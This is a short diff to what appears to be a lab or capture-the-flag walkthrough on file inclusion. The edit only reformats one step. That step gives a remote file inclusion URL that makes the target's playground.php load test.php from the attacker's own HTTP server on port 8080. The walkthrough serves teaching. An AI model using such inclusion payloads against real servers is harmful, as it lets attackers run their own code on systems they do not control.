@@ -110,7 +110,8 @@ Which would look like this
 ![lab4_http_server](./Images/Lab4_http_server.png)  
 We now have running a http.server in our directoy which will allow us to download the test.php file from the web server.  
 
-Navigate back to the playground webpage and enter the following into the address bar ```MACHINE_IP/playground.php?file=http://YOUR_MACHINE_IP:8080/test.php```  
+Navigate back to the playground webpage and enter the following into the address bar  
+```MACHINE_IP/playground.php?file=http://YOUR_MACHINE_IP:8080/test.php```  
 If done correctly we will be able to see a **GET** requested recived in our terminal with the running http server as below.
 ![lab4_pull_request](./Images/lab4_pull_request.png)
 
